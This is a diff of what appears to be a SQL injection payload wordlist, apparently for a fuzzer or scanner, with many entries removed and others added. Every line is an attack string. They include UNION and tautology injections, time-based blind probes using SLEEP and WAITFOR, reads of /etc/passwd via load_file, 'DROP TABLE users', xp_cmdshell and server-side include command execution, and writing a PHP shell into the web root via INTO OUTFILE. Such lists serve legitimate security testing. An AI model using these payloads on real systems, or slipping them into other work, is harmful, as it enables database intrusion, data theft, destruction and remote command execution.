@@ -1,91 +1,26 @@
+' AND 1=2 UNION SELECT 1,2,3,4,5--
 ' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
 ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
-' AND (SELECT 20 FROM (SELECT(SLEEP(5)))a)--
-' AND 1=0 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables--
-' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
-' and extractvalue(1,concat(0x7e,(select version())))--
-' and if(substring(user(),1,1)='r',sleep(5),0)--
-' and row(1,1)>(select count(*),concat((select version()),0x3a,floor(rand()*2))x from information_schema.tables group by x)--
-' and updatexml(1,concat(0x7e,(select version())),1)--
-' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
-' or ''='
-' OR 1=1--
-' OR '1'='1
-' OR '1'='1'--
-' OR 1=1 GROUP BY 1--
-' or 1=1 into outfile '/tmp/test.txt'--
-' OR 1=1 LIMIT 1--
-' OR 1=1 ORDER BY 1--
-' or 1=1#
-' or 1=1/*
-' OR '1'='1'/*
-' OR 'a'='a
-' OR 'a'='a'--
-' OR 'a'='a'/*
-' OR BENCHMARK(1000000,MD5(1))--
+'); DROP TABLE users;--
+<!--#exec cmd="ls" -->
+<!--#exec cmd="whoami" -->
+'; EXEC xp_cmdshell('whoami');--
+' OR 1=1 INTO DUMPFILE '/tmp/exploit'--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
+' OR SLEEP(10)--
+" OR SLEEP(5)--
 ' OR SLEEP(5)--
-' or 'x'='x
-' UNION SELECT @@version,NULL,NULL--
-' UNION SELECT database(),NULL,NULL--
+(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
+' UNION SELECT 1,2,3--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT database(),NULL--
+' UNION SELECT load_file('/etc/passwd'),NULL--
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT user(),NULL,NULL--
-" or "1"="1
-" or "1"="1"--
-" OR 1=1--
-" OR SLEEP(5)--
-") OR "1"="1
-") or ("1"="1
-%27 or 1=1--
-%27%20or%201%3d1--
-') or ('1'='1--
-') OR '1'='1
-') or '1'='1--
-')) OR (('1'='1
-'; drop table users--
-'; exec master..xp_cmdshell('whoami')--
-'; exec xp_cmdshell('whoami')--
-\' or 1=1--
-1' and (select 1 from(select count(*),concat((select database()),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a)--
-1' and (select substring(username,1,1) from users limit 1)='a'--
-1' and ascii(substring((select database()),1,1))>64--
-1' and benchmark(1000000,sha1(1))--
-1' and if(1=1,sleep(5),0)--
-1' and if(1=2,sleep(5),0)--
-1' and sleep(5)--
-1' and sleep(5)#
-1' OR '1'='1
--1' OR 1=1--
-1' or '1'='1' union select 1,database()--
-1' or '1'='1' union select 1,load_file('/etc/passwd')--
-1' or '1'='1' union select 1,user()--
-1' or '1'='1' union select 1,version()--
-1' order by 1--
-1' order by 2--
-1' order by 3--
-1' union select 1,2,3--
-1' union select column_name,null from information_schema.columns--
-1' union select null--
-1' union select null,load_file('/etc/passwd')--
-1' union select null,null--
-1' union select null,null,null--
-1' union select table_name,null from information_schema.tables--
-1' union select username,password from users--
-1 union%0aselect null--
-1" OR "1"="1
--1" OR 1=1--
-1) or 1=1--
-1)) or ((1=1--
-1/*!union*/select null--
-1/**/union/**/select/**/null--
-1; waitfor delay '0:0:5'--
-1'; waitfor delay '0:0:5'--
-a' or 1=1;drop table users;--
-admin'--
-admin' --
-admin' #
-admin' AND 1=0--
-admin' AND 1=1--
-admin'/*
+' UNION SELECT schema(),NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT user(),NULL--
+' UNION SELECT @@version,NULL--
+WAITFOR DELAY '0:0:10'--
+WAITFOR DELAY '0:0:5'--
